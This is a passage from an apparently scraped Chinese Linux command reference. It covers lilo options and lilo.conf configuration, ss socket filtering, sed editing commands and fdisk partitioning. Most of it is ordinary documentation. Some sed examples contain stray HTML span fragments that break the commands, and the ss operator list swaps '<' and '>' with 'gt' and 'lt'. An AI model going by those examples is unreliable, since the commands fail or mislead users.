-D&lt;识别标签&gt;：指定开机后预设启动的操作系统，或系统核心识别标签； -f&lt;几何参数文件&gt;：指定磁盘的几何参数配置文件； -i&lt;开机磁区文件&gt;：指定欲使用的开机磁区文件，预设是/boot 目录里的 boot.b 文件； -I&lt;识别标签&gt;：显示系统核心存放之处； -l：产生线形磁区地址； -m&lt;映射文件&gt;：指定映射文件； -P&lt;fix/ignore&gt;：决定要修复或忽略分区表的错误； -q：列出映射的系统核心文件； -r&lt;根目录&gt;：设置系统启动时欲挂入成为根目录的目录； -R&lt;执行指令&gt;：设置下次启动系统时，首先执行的指令； -s&lt;备份文件&gt;：指定备份文件； -S&lt;备份文件&gt;：强制指定备份文件； -t：不执行指令，仅列出实际执行会进行的动作； -u&lt;外围色设备代号&gt;：删除 lilo； -U&lt;外围设备代号&gt;：此选项的效果和指定&quot;-u&quot;参数类似，当不检查时间戳记； -v：显示指令执行过程； -V：显示版本信息。 实例 使用 LILO 作为引导加载程序 要使用 LILO 作为引导加载程序，需要做的事情取决于是要进行全新安装还是要让已经安装的 Linux 改为使用 LILO。如果是要进行全新安装，那么直接跳转到 配置 LILO 那一节。如果已经安装了某个 Linux 发行版，那么通常可以选择安装并配置 LILO（并可以将机器引导到新的 Linux 安装）。 要将现有的 Linux 迁移到 LILO，首先必须获得最新版本的 LILO（见 参考资料）。在做任何其他事情之前，建议您确保在手边拥有一张 Linux 引导盘 —— 如果偶而弄错了某些地方，它可以提供很大的帮助，能够恢复到初始的 Linux 配置！将 LILO 安装到系统中之后，让它接管 MBR 非常简单。以 root 用户身份输入： /sbin/lilo -v -v 这将使用当前的 LILO 默认值，抹去 MBR 中当前所有内容。不过，请阅读 配置 LILO，以确保能够按预期引导起来。也要注意，如果想要在同一机器上运行 Windows 和 Linux，那么应该先安装 Windows OS，然后再安装 Linux OS，这样，在 Linux 安装中所选择的引导加载程序就不会被 Windows 引导加载程序所覆盖。与 Linux 引导加载程序不同，多数 Window 引导加载程序不支持引导 Linux。如果已经先安装了 Linux，那么只需要自己创建一张 Linux 引导盘，这样就可以在安装完 Windows 之后，回到 Linux 安装中并重写 MBR。 配置 LILO LILO 的配置都是通过位于 /etc/lilo.conf 的一个配置文件来完成的。清单 1 给出了一个示例配置，使用的是我的家用机器，支持 Linux 和 Windows 机器的双重引导。了解我的工作站的基本配置，就可以想像出这些配置是如何与实际机器相关联的： 主 HDD（物理磁盘 1）上安装了 Windows XP（最初机器上只有它）。在 Linux 术语中，这个 HDD 是 /dev/hda（在 grub 术语中是 hd0,0）。 从 HDD（物理磁盘 2）上安装了 Red Hat Linux； root 分区位于这个硬盘驱动器的第三个分区，即 /dev/hdb3（在 GRUB 术语中是 hd1,3）。 lilo.conf 示例文件： boot=/dev/hda map=/boot/map install=/boot/boot.b prompt timeout=100 compact default=Linux image=/boot/vmlinuz-2.4.18-14 label=Linux root=/dev/hdb3 read-only password=linux other=/dev/hda label=WindowsXP 配置文件选项说明： boot= 行告诉 LILO 在哪里安装引导加载程序。在上面的示例中，将把它安装到第一块硬盘的 MBR。也可以选择将 LILO 安装到 /dev/hdb3（示例中的 Linux 分区），这样需要向 /dev/hda 安装另一个引导加载程序，并令其指向 LILO 引导加载程序； 然后只需要让 LILO 作为二级引导加载程序。通常，引导加载程序应该位于 /dev/hda。还可以将这个参数指向软盘驱动器（最常见的是 /dev/fd0），来制做 LILO 软盘引导磁盘。 map= 指向引导期间 LILO 内部使用的映射文件。当使用 /sbin/lilo 命令安装 LILO 时， 它会自动生成这个文件，其中包含有描述符表（还有其他内容）。建议不要改动这个文件！ install= 是 LILO 在引导过程中内部使用的文件之一。它同时包含有引导加载程序的主要部分和二级部分。boot.b 文件的 一个片段被写入到 MBR（引导加载程序的主要部分），它会指向那个映射，接下来指向二级引导加载程序。同样，不要改动它！ prompt= 告诉 LILO 使用用户界面（本例中给出了两个选择 —— Linux 和 WindowsXP）。除了使用 prompt/user 界面以外，在适当情况下还可以为 Linux 内核等指定具体的参数。如果不在配置文件中指定此选项，那么 LILO 将引导到 默认的 OS，不发生任何用户交互，也不会等待。（但是请注意，如果在引导时按下了 SHIFT，那么还是可以得到提示，当不想把 引导加载程序暴露给普通用户时，这非常有用）。 timeout= 是引导提示在自动引导默认 OS（本例中是 Linux）之前的等待时间（以十分之一秒为单位）。 如果在 lilo.conf 没有指定 prompt，那么这个参数就会被忽略。 compact 选项可以大大加速引导过程，它会将连续的读磁盘的请求合并为一个单独的请求。不过，这可能是 一件祸福参半的事情，因为我在论坛上看到过很多贴子提到了关于此选项的问题。当希望从软盘引导时，这个选项尤其有用。 default= 选项告诉 LILO 默认使用哪个映像进行引导，比如在等待超时之后。这与 lilo.conf 文件中的某个映像的 标签相关联。如果没有在配置文件中指定此选项，那么它将引导文件中指定的第一个映像。 对于允许用户引导到的每一个 Linux 版本，都应该指定 image= 及以下三个选项。image 选项指定希望 引导到的内核版本。 label= 标明了在运行期间希望能够从用户界面引导的不同 OS。另外，这个标签用于指定引导的默认 OS。 （注意：标签名称中避免出现空格； 否则，引导那个文件时会出现无法预期的错误。） root= 告诉 LILO OS 文件系统实际所在的位置。在我们的示例中为 /dev/hdb3，即第二块硬盘上的第三个分区。 read-only 告诉 LILO 以只读的方式初始引导到文件系统。OS 一旦完全引导起来，就会以读写方式挂载。 password= 允许您为将要引导到的特定 OS 设置口令。不幸的是，这个口令是以可读文本的方式保存在 lilo.conf 文件中，所以，所有人都能够读取它。如果需要，还可以对想要引导自的每个操作系统设置口令（在我们的示例中，只为 Linux 的引导 设置了一个口令）。 other= 的动作类似于 image 和 root 选项的组合，但是用于除了 Linux 以外的其他操作系统。 在我们的示例中，它告诉 LILO 到哪里去找到 Windows OS（位于第一块硬盘的第一个分区）。如果先安装 Windows，后安装 Linux，通常会是这样。 label= 与所有其他 label 选项相同。 在 lilo.conf 文件中可以使用很多其他参数，不过清单 1 中的参数就足以让机器可用了。要获得关于 lilo.conf 的这些以及其他参数的 进一步资料，请参考手册页（man lilo.conf）。由于在引导时不会读取 lilo.conf，所以，当这个文件有改动时，需要“更新”MBR。 如果不完成此步骤就重新引导，那么对 lilo.conf 的修改不会在启动中反映出来。与先前将 LILO 写入 MBR 类似，需要运行： /sbin/lilo -v -v -v -v标记会为您给出非常详细的输出。当像我们那样运行 LILO 时，有很多参数可以指定。 参阅手册页以获得更进一步的信息（man lilo）。 初始引导过程 当 LILO 初始引导时，它会按次序打印出每个字母 —— L-I-L-O。如果所有字母都显示出来，那么第一阶段引导就成功了。缺少任何内容 都表示出现了问题： L：第一阶段引导加载程序已经被加载。如果 LILO 停止在这里，那么是在引导第二阶段引导加载程序时出现了问题。这通常会伴随有一个错误代码。 在这个阶段的常见问题是介质问题，或者在 lilo.conf 文件中指定了不正确的磁盘参数。 LI：第二阶段引导加载程序已经被加载。LILO 在此处停止表示第二阶段引导加载程序不能被执行。同样，这可能是因为出现了与只显示 L 类似的问题： 正在加载，或者因 boot.b 文件被破坏、移动或删除而不能加载。 LIL：第二阶段引导加载程序正在被执行。此时，可能会再次出现介质问题，或者映射文件（如 lilo.conf 文件中所指定的）在寻找描述符表时 可能会出现问题。 LIL?：加载到与上面相同的阶段。这通常意味着加载第二阶段引导加载程序使用了错误的地址，最常见的原因是 boot.b 所在的位置与 lilo.conf 文件所指定的不同。 LIL-：加载到与上面相同的阶段。加载描述符表时出现问题，最常见的原因是描述符表错误。 LILO：LILO 成功被加载，没有出现任何错误。 引导时的附加配置 LILO 被成功加载后，将看到 LILO 提示符。还是使用前面的示例 lilo.conf 文件，此时将有两个选择，可能对 LILO 新手来说并不直观。首先，可以 让 LILO 超时（10 秒后），这将引导/dev/hdb3，即 Linux 分区。另外，可以按下 TAB 键，这将列出将要引导的操作系统选项。在我们的示例 lilo.conf 中， 将得到的选项是 “Linux” 和 “Windows”。输入哪一个，就会引导到哪个 OS。指定加载 Linux 选项，会提示输入一个口令，在本例中是 linux。如果输入的口令有误，则会返回 LILO 提示符。 不幸的是，LILO 不支持引导期间的交互式配置，所以，只能在 lilo.conf 中或者运行/sbin/lilo时指定选项。 关于第一次尝试 LILO 的最后一点建议是：我发现使用软盘引导磁盘比使用硬盘实现 LILO 配置更为安全。为此，必须在 lilo.conf 文件中使用boot=/dev/fd0替换boot=/dev/hda。那样，如果弄乱了 lilo.conf 文件 中的任何配置，都可以取出引导磁盘并像先前一样引导到 Linux。当使用软盘进行引导一切正常以后，可以将 lilo.conf 修改回boot=/dev/hda，然后最后一次运行/sbin/lilo来上传修改。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lilo","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lilo/","stats":{"text":"12 min read","time":714000,"words":3258,"minutes":12},"date":"2022-02-02 15:56:42","dateFormat":"2022-02-02"},{"content":"比 netstat 好用的 socket 统计信息，iproute2 包附带的另一个工具，允许你查询 socket 的有关统计信息。 补充说明 ss 命令用来显示处于活动状态的套接字信息。ss 命令可以用来获取 socket 统计信息，它可以显示和 netstat 类似的内容。但 ss 的优势在于它能够显示更多更详细的有关 TCP 和连接状态的信息，而且比 netstat 更快速更高效。 当服务器的 socket 连接数量变得非常大时，无论是使用 netstat 命令还是直接cat /proc/net/tcp，执行速度都会很慢。可能你不会有切身的感受，但请相信我，当服务器维持的连接达到上万个的时候，使用 netstat 等于浪费 生命，而用 ss 才是节省时间。 天下武功唯快不破。ss 快的秘诀在于，它利用到了 TCP 协议栈中 tcp_diag。tcp_diag 是一个用于分析统计的模块，可以获得 Linux 内核中第一手的信息，这就确保了 ss 的快捷高效。当然，如果你的系统中没有 tcp_diag，ss 也可以正常运行，只是效率会变得稍慢。 语法 ss [参数 ] ss [参数 ] [过滤 ] 选项 -h, --help 帮助信息 -V, --version 程序版本信息 -n, --numeric 不解析服务名称 -r, --resolve 解析主机名 -a, --all 显示所有套接字（sockets） -l, --listening 显示监听状态的套接字（sockets） -o, --options 显示计时器信息 -e, --extended 显示详细的套接字（sockets）信息 -m, --memory 显示套接字（socket）的内存使用情况 -p, --processes 显示使用套接字（socket）的进程 -i, --info 显示 TCP 内部信息 -s, --summary 显示套接字（socket）使用概况 -4, --ipv4 仅显示 IPv4 的套接字（sockets） -6, --ipv6 仅显示 IPv6 的套接字（sockets） -0, --packet 显示 PACKET 套接字（socket） -t, --tcp 仅显示 TCP 套接字（sockets） -u, --udp 仅显示 UCP 套接字（sockets） -d, --dccp 仅显示 DCCP 套接字（sockets） -w, --raw 仅显示 RAW 套接字（sockets） -x, --unix 仅显示 Unix 套接字（sockets） -f, --family=FAMILY 显示 FAMILY 类型的套接字（sockets），FAMILY 可选，支持 unix, inet, inet6, link, netlink -A, --query=QUERY, --socket=QUERY QUERY := {all|inet|tcp|udp|raw|unix|packet|netlink}[,QUERY] -D, --diag=FILE 将原始 TCP 套接字（sockets）信息转储到文件 -F, --filter=FILE 从文件中都去过滤器信息 FILTER := [ state TCP-STATE ] [ EXPRESSION ] 实例 ss -t -a # 显示 TCP 连接 ss -s # 显示 Sockets 摘要 ss -l # 列出所有打开的网络连接端口 ss -pl # 查看进程使用的 socket ss -lp | grep 3306 # 找出打开套接字/端口应用程序 ss -u -a 显示所有 UDP Sockets ss -o state established '( dport = :smtp or sport = :smtp )' # 显示所有状态为 established 的 SMTP 连接 ss -o state established '( dport = :http or sport = :http )' # 显示所有状态为 Established 的 HTTP 连接 ss -o state fin-wait-1 '( sport = :http or sport = :https )' dst 193.233.7/24 # 列举出处于 FIN-WAIT-1 状态的源端口为 80 或者 443，目标网络为 193.233.7/24 所有 tcp 套接字 # ss 和 netstat 效率对比 time netstat -at time ss # 匹配远程地址和端口号 # ss dst ADDRESS_PATTERN ss dst 192.168.1.5 ss dst 192.168.119.113:http ss dst 192.168.119.113:smtp ss dst 192.168.119.113:443 # 匹配本地地址和端口号 # ss src ADDRESS_PATTERN ss src 192.168.119.103 ss src 192.168.119.103:http ss src 192.168.119.103:80 ss src 192.168.119.103:smtp ss src 192.168.119.103:25 将本地或者远程端口和一个数比较 # ss dport OP PORT 远程端口和一个数比较； # ss sport OP PORT 本地端口和一个数比较 # OP 可以代表以下任意一个: # &lt;= or le : 小于或等于端口号 # &gt;= or ge : 大于或等于端口号 # == or eq : 等于端口号 # != or ne : 不等于端口号 # &lt; or gt : 小于端口号 # &gt; or lt : 大于端口号 ss sport = :http ss dport = :http ss dport \\&gt; :1024 ss sport \\&gt; :1024 ss sport \\&lt; :32000 ss sport eq :22 ss dport != :22 ss state connected sport = :http ss \\( sport = :http or sport = :https \\) ss -o state fin-wait-1 \\( sport = :http or sport = :https \\) dst 192.168.1/24 用 TCP 状态过滤 Sockets ss -4 state closing # ss -4 state FILTER-NAME-HERE # ss -6 state FILTER-NAME-HERE # FILTER-NAME-HERE 可以代表以下任何一个： # established、 syn-sent、 syn-recv、 fin-wait-1、 fin-wait-2、 time-wait、 closed、 close-wait、 last-ack、 listen、 closing、 # all : 所有以上状态 # connected : 除了 listen and closed 的所有状态 # synchronized :所有已连接的状态除了 syn-sent # bucket : 显示状态为 maintained as minisockets,如：time-wait 和 syn-recv. # big : 和 bucket 相反. 显示 ICP 连接 [root@localhost ~]# ss -t -a State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 0 *:3306 *:* LISTEN 0 0 *:http *:* LISTEN 0 0 *:ssh *:* LISTEN 0 0 127.0.0.1:smtp *:* ESTAB 0 0 112.124.15.130:42071 42.156.166.25:http ESTAB 0 0 112.124.15.130:ssh 121.229.196.235:33398 显示 Sockets 摘要 [root@localhost ~]# ss -s Total: 172 (kernel 189) TCP: 10 (estab 2, closed 4, orphaned 0, synrecv 0, timewait 0/0), ports 5 Transport Total ip IPv6 * 189 - - RAW 0 0 0 UDP 5 5 0 TCP 6 6 0 INET 11 11 0 FRAG 0 0 0 列出当前的 established, closed, orphaned and waiting TCP sockets 列出所有打开的网络连接端口 [root@localhost ~]# ss -l Recv-Q Send-Q Local Address:Port Peer Address:Port 0 0 *:3306 *:* 0 0 *:http *:* 0 0 *:ssh *:* 0 0 127.0.0.1:smtp *:* 查看进程使用的 socket [root@localhost ~]# ss -pl Recv-Q Send-Q Local Address:Port Peer Address:Port 0 0 *:3306 *:* users:((&quot;mysqld&quot;,1718,10)) 0 0 *:http *:* users:((&quot;nginx&quot;,13312,5),(&quot;nginx&quot;,13333,5)) 0 0 *:ssh *:* users:((&quot;sshd&quot;,1379,3)) 0 0 127.0.0.1:smtp *:* us 找出打开套接字/端口应用程序 [root@localhost ~]# ss -pl | grep 3306 0 0 *:3306 *:* users:((&quot;mysqld&quot;,1718,10)) 显示所有 UDP Sockets [root@localhost ~]# ss -u -a State Recv-Q Send-Q Local Address:Port Peer Address:Port UNCONN 0 0 *:syslog *:* UNCONN 0 0 112.124.15.130:ntp *:* UNCONN 0 0 10.160.7.81:ntp *:* UNCONN 0 0 127.0.0.1:ntp *:* UNCONN 0 0 *:ntp *:* 出所有端口为 22（ssh）的连接 ss state all sport = :ssh Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port tcp LISTEN 0 128 *:ssh *:* tcp ESTAB 0 0 192.168.0.136:ssh 192.168.0.102:46540 tcp LISTEN 0 128 :::ssh :::* ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ss","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ss/","stats":{"text":"8 min read","time":424000,"words":1493,"minutes":8},"date":"2022-02-02 15:54:30","dateFormat":"2022-02-02"},{"content":"功能强大的流式文本编辑器。 补充说明 sed 是一种流编辑器，它是文本处理中非常重要的工具，能够完美的配合正则表达式使用，功能不同凡响。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用 sed 命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有 改变，除非你使用重定向存储输出。Sed 主要用来自动编辑一个或多个文件； 简化对文件的反复操作； 编写转换程序等。 sed 的选项、命令、替换标记 命令格式 sed [options] 'command' file(s) sed [options] -f scriptfile file(s) 选项 -e&lt;script&gt;或--expression=&lt;script&gt;：以选项中的指定的 script 来处理输入的文本文件； -f&lt;script 文件&gt;或--file=&lt;script 文件&gt;：以选项中指定的 script 文件来处理输入的文本文件； -h 或--help：显示帮助； -n 或--quiet 或——silent：仅显示 script 处理后的结果； -V 或--version：显示版本信息。 参数 文件：指定待处理的文本文件列表。 sed 命令 a\\ # 在当前行下面插入文本。 i\\ # 在当前行上面插入文本。 c\\ # 把选定的行改为新的文本。 d # 删除，删除选择的行。 D # 删除模板块的第一行。 s # 替换指定字符 h # 拷贝模板块的内容到内存中的缓冲区。 H # 追加模板块的内容到内存中的缓冲区。 g # 获得内存缓冲区的内容，并替代当前模板块中的文本。 G # 获得内存缓冲区的内容，并追加到当前模板块文本的后面。 l # 列表不能打印字符的清单。 n # 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。 N # 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。 p # 打印模板块的行。 P # (大写) 打印模板块的第一行。 q # 退出 Sed。 b lable # 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。 r file # 从 file 中读行。 t label # if 分支，从最后一行开始，条件一旦满足或者 T，t 命令，将导致分支到带有标号的命令处，或者到脚本的末尾。 T label # 错误分支，从最后一行开始，一旦发生错误或者 T，t 命令，将导致分支到带有标号的命令处，或者到脚本的末尾。 w file # 写并追加模板块到 file 末尾。 W file # 写并追加模板块的第一行到 file 末尾。 ! # 表示后面的命令对所有没有被选定的行发生作用。 = # 打印当前行号码。 # # 把注释扩展到下一个换行符以前。 sed 替换标记 g # 表示行内全面替换。 p # 表示打印行。 w # 表示把行写入一个文件。 x # 表示互换模板块中的文本和缓冲区中的文本。 y # 表示把一个字符翻译为另外的字符（但是不用于正则表达式） \\1 # 子串匹配标记 &amp; # 已匹配字符串标记 sed 元字符集 ^ # 匹配行开始，如：/^sed/匹配所有以 sed 开头的行。 $ # 匹配行结束，如：/sed$/匹配所有以 sed 结尾的行。 . # 匹配一个非换行符的任意字符，如：/s.d/匹配 s 后接一个任意字符，最后是 d。 * # 匹配 0 个或多个字符，如：/*sed/匹配所有模板是一个或多个空格后紧跟 sed 的行。 [] # 匹配一个指定范围内的字符，如/[ss]ed/匹配 sed 和 Sed。 [^] # 匹配一个不在指定范围内的字符，如：/[^A-RT-Z]ed/匹配不包含 A-R 和 T-Z 的一个字母开头，紧跟 ed 的行。 \\(..\\) # 匹配子串，保存匹配的字符，如 s/\\(love\\)able/\\1rs，loveable 被替换成 lovers。 &amp; # 保存搜索字符用来替换其他字符，如 s/love/ **&amp;** /，love 这成 **love** 。 \\&lt; # 匹配单词的开始，如:/\\&lt;love/匹配包含以 love 开头的单词的行。 \\&gt; # 匹配单词的结束，如/love\\&gt;/匹配包含以 love 结尾的单词的行。 x\\{m\\} # 重复字符 x，m 次，如：/0\\{5\\}/匹配包含 5 个 0 的行。 x\\{m,\\} # 重复字符 x，至少 m 次，如：/0\\{5,\\}/匹配至少有 5 个 0 的行。 x\\{m,n\\} # 重复字符 x，至少 m 次，不多于 n 次，如：/0\\{5,10\\}/匹配 5~10 个 0 的行。 sed 用法实例 替换操作：s 命令 替换文本中的字符串： sed 's/book/books/' file -n 选项 和 p 命令一起使用表示只打印那些发生替换的行： sed -n 's/test/TEST/p' file 直接编辑文件 选项-i ，会匹配 file 文件中每一行的所有 book 替换为 books： sed -i 's/book/books/g' file 全面替换标记 g 使用后缀 /g 标记会替换每一行中的所有匹配： sed 's/book/books/g' file 当需要从第 N 处匹配开始替换时，可以使用 /Ng： echo sksksksksksk | sed 's/sk/SK/2g' skSKSKSKSKSK echo sksksksksksk | sed 's/sk/SK/3g' skskSKSKSKSK echo sksksksksksk | sed 's/sk/SK/4g' skskskSKSKSK 定界符 以上命令中字符 / 在 sed 中作为定界符使用，也可以使用任意的定界符： sed 's:test:TEXT:g' sed 's|test|TEXT|g' 定界符出现在样式内部时，需要进行转义： sed 's/\\/bin/\\/usr\\/local\\/bin/g' 删除操作：d 命令 删除空白行： sed '/^$/d' file 删除文件的第 2 行： sed '2d' file 删除文件的第 2 行到末尾所有行： sed '2,$d' file 删除文件最后一行： sed '$d' file 删除文件中所有开头是 test 的行： sed '/^test/'d file 已匹配字符串标记&amp; 正则表达式 \\w+ 匹配每一个单词，使用 [&amp;] 替换它，&amp; 对应于之前所匹配到的单词： echo this is a test line | sed 's/\\w\\+/[&amp;]/g' [this] [is] [a] [test] [line] 所有以 192.168.0.1 开头的行都会被替换成它自已加 localhost： sed 's/^192.168.0.1/&amp;localhost/' file 192.168.0.1localhost 子串匹配标记\\1 匹配给定样式的其中一部分： echo this is digit 7 in a number | sed 's/digit \\([0-9]\\)/&lt;span title=&quot;\\1&quot;&gt;\\1/' this is 7 in a number 命令中 digit 7，被替换成了 7。样式匹配到的子串是 7，(..) 用于匹配子串，对于匹配到的第一个子串就标记为 \\1 ，依此类推匹配到的第二个结果就是 \\2 ，例如： echo aaa BBB | sed 's/\\([a-z]\\+\\) \\([A-Z]\\+\\)/&lt;span title=&quot;\\2&quot;&gt;\\2 &lt;span title=&quot;\\1&quot;&gt;\\1/' BBB aaa love 被标记为 1，所有 loveable 会被替换成 lovers，并打印出来： sed -n 's/\\(love\\)able/&lt;span title=&quot;\\1&quot;&gt;\\1rs/p' file 组合多个表达式 sed ' 表达式 ' | sed ' 表达式 ' 等价于： sed ' 表达式; 表达式 ' 引用 sed 表达式可以使用单引号来引用，但是如果表达式内部包含变量字符串，就需要使用双引号。 test=hello echo hello WORLD | sed &quot;s/$test/HELLO&quot; HELLO WORLD 选定行的范围：,（逗号） 所有在模板 test 和 check 所确定的范围内的行都被打印： sed -n '/test/,/check/p' file 打印从第 5 行开始到第一个包含以 test 开始的行之间的所有行： sed -n '5,/^test/p' file 对于模板 test 和 west 之间的行，每行的末尾用字符串 aaa bbb 替换： sed '/test/,/west/s/$/aaa bbb/' file 多点编辑：e 命令 -e 选项允许在同一行里执行多条命令： sed -e '1,5d' -e 's/test/check/' file 上面 sed 表达式的第一条命令删除 1 至 5 行，第二条命令用 check 替换 test。命令的执行顺序对结果有影响。如果两个命令都是替换命令，那么第一个替换命令将影响第二个替换命令的结果。 和 -e 等价的命令是 --expression： sed --expression='s/test/check/' --expression='/love/d' file 从文件读入：r 命令 file 里的内容被读进来，显示在与 test 匹配的行后面，如果匹配多行，则 file 的内容将显示在所有匹配行的下面： sed '/test/r file' filename 写入文件：w 命令 在 example 中所有包含 test 的行都被写入 file 里： sed -n '/test/w file' example 追加（行下）：a\\命令 将 this is a test line 追加到 以 test 开头的行后面： sed '/^test/a&lt;span title=&quot;\\t&quot;&gt;\\this is a test line' file 在 test.conf 文件第 2 行之后插入 this is a test line： sed -i '2a&lt;span title=&quot;\\t&quot;&gt;\\this is a test line' test.conf 插入（行上）：i\\命令 将 this is a test line 追加到以 test 开头的行前面： sed '/^test/i&lt;span title=&quot;\\t&quot;&gt;\\this is a test line' file 在 test.conf 文件第 5 行之前插入 this is a test line： sed -i '5i&lt;span title=&quot;\\t&quot;&gt;\\this is a test line' test.conf 下一个：n 命令 如果 test 被匹配，则移动到匹配行的下一行，替换这一行的 aa，变为 bb，并打印该行，然后继续： sed '/test/{ n; s/aa/bb/; }' file 变形：y 命令 把 1~10 行内所有 abcde 转变为大写，注意，正则表达式元字符不能使用这个命令： sed '1,10y/abcde/ABCDE/' file 退出：q 命令 打印完第 10 行后，退出 sed sed '10q' file 保持和获取：h 命令和 G 命令 在 sed 处理文件的时候，每一行都被保存在一个叫模式空间的临时缓冲区中，除非行被删除或者输出被取消，否则所有被处理的行都将 打印在屏幕上。接着模式空间被清空，并存入新的一行等待处理。 sed -e '/test/h' -e '$G' file 在这个例子里，匹配 test 的行被找到后，将存入模式空间，h 命令将其复制并存入一个称为保持缓存区的特殊缓冲区内。第二条语句的意思是，当到达最后一行后，G 命令取出保持缓冲区的行，然后把它放回模式空间中，且追加到现在已经存在于模式空间中的行的末尾。在这个例子中就是追加到最后一行。简单来说，任何包含 test 的行都被复制并追加到该文件的末尾。 保持和互换：h 命令和 x 命令 互换模式空间和保持缓冲区的内容。也就是把包含 test 与 check 的行互换： sed -e '/test/h' -e '/check/x' file 脚本 scriptfile sed 脚本是一个 sed 的命令清单，启动 Sed 时以-f 选项引导脚本文件名。Sed 对于脚本中输入的命令非常挑剔，在命令的末尾不能有任何空白或文本，如果在一行中有多个命令，要用分号分隔。以#开头的行为注释行，且不能跨行。 sed [options] -f scriptfile file(s) 打印奇数行或偶数行 方法 1： sed -n 'p;n' test.txt #奇数行 sed -n 'n;p' test.txt #偶数行 方法 2： sed -n '1~2p' test.txt #奇数行 sed -n '2~2p' test.txt #偶数行 打印匹配字符串的下一行 grep -A 1 SCC URFILE sed -n '/SCC/{n;p}' URFILE awk '/SCC/{getline; print}' URFILE ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sed","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sed/","stats":{"text":"12 min read","time":692000,"words":2872,"minutes":12},"date":"2022-02-02 15:41:03","dateFormat":"2022-02-02"},{"content":"查看磁盘使用情况和磁盘分区。 补充说明 fdisk 命令用于观察硬盘实体使用情况，也可对硬盘分区。它采用传统的问答式界面，而非类似 DOS fdisk 的 cfdisk 互动式操作界面，因此在使用上较为不便，但功能却丝毫不打折扣。 语法 fdisk (选项) (参数) 选项 -b &lt;大小&gt; 扇区大小 (512、1024、2048 或 4096) -c[=&lt;模式&gt;] 兼容模式：“dos”或“nondos”(默认) -h 打印此帮助文本 -u[=&lt;单位&gt;] 显示单位：“cylinders”(柱面) 或“sectors”(扇区，默认) -v 打印程序版本 -C &lt;数字&gt; 指定柱面数 -H &lt;数字&gt; 指定磁头数 -S &lt;数字&gt; 指定每个磁道的扇区数 参数 设备文件：指定要进行分区或者显示分区的硬盘设备文件。 实例 首先选择要进行操作的磁盘： [root@localhost ~]# fdisk /dev/sdb 输入m列出可以执行的命令： command (m for help): m Command action a toggle a bootable flag b edit bsd disklabel c toggle the dos compatibility flag d delete a partition l list known partition types m print this menu n add a new partition o create a new empty DOS partition table p print the partition table q quit without saving changes s create a new empty Sun disklabel t change a partition's system id u change display/entry units v verify the partition table w write table to disk and exit x extra functionality (experts only) 输入p列出磁盘目前的分区情况： Command (m for help): p Disk /dev/sdb: 3221 MB, 3221225472 bytes 255 heads, 63 sectors/track, 391 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sdb1 1 1 8001 8e Linux LVM /dev/sdb2 2 26 200812+ 83 Linux 输入d然后选择分区，删除现有分区： Command (m for help): d Partition number (1-4): 1 Command (m for help): d Selected partition 2 查看分区情况，确认分区已经删除： Command (m for help): print Disk /dev/sdb: 3221 MB, 3221225472 bytes 255 heads, 63 sectors/track, 391 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System Command (m for help): 输入n建立新的磁盘分区，首先建立两个主磁盘分区： Command (m for help): n Command action e extended p primary partition (1-4) p //建立主分区 Partition number (1-4): 1 //分区号 First cylinder (1-391, default 1): //分区起始位置 Using default value 1 last cylinder or +size or +sizeM or +sizeK (1-391, default 391): 100 //分区结束位置，单位为扇区 Command (m for help): n //再建立一个分区 Command action e extended p primary partition (1-4) p Partition number (1-4): 2 //分区号为 2 First cylinder (101-391, default 101): Using default value 101 Last cylinder or +size or +sizeM or +sizeK (101-391, default 391): +200M //分区结束位置，单位为 M 确认分区建立成功： Command (m for help): p Disk /dev/sdb: 3221 MB, 3221225472 bytes 255 heads, 63 sectors/track, 391 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sdb1 1 100 803218+ 83 Linux /dev/sdb2 101 125 200812+ 83 Linux 再建立一个逻辑分区： Command (m for help): n Command action e extended p primary partition (1-4) e //选择扩展分区 Partition number (1-4): 3 First cylinder (126-391, default 126): Using default value 126 Last cylinder or +size or +sizeM or +sizeK (126-391, default 391): Using default value 391 确认扩展分区建立成功： Command (m for help): p Disk /dev/sdb: 3221 MB, 3221225472 bytes 255 heads, 63 sectors/track, 391 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sdb1 1 100 803218+ 83 Linux /dev/sdb2 101 125 200812+ 83 Linux /dev/sdb3 126 391 2136645 5 Extended 在扩展分区上建立两个逻辑分区： Command (m for help): n Command action l logical (5 or over) p primary partition (1-4) l //选择逻辑分区 First cylinder (126-391, default 126): Using default value 126 Last cylinder or +size or +sizeM or +sizeK (126-391, default 391): +400M Command (m for help): n Command action l logical (5 or over) p primary partition (1-4) l First cylinder (176-391, default 176): Using default value 176 Last cylinder or +size or +sizeM or +sizeK (176-391, default 391): Using default value 391 确认逻辑分区建立成功： Command (m for help): p Disk /dev/sdb: 3221 MB, 3221225472 bytes 255 heads, 63 sectors/track, 391 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Device Boot Start End Blocks Id System /dev/sdb1 1 100 803218+ 83 Linux /dev/sdb2 101 125 200812+ 83 Linux /dev/sdb3 126 391 2136645 5 Extended /dev/sdb5 126 175 401593+ 83 Linux /dev/sdb6 176 391 1734988+ 83 Linux Command (m for help): 从上面的结果我们可以看到，在硬盘 sdb 我们建立了 2 个主分区（sdb1，sdb2），1 个扩展分区（sdb3），2 个逻辑分区（sdb5，sdb6） 注意：主分区和扩展分区的磁盘号位 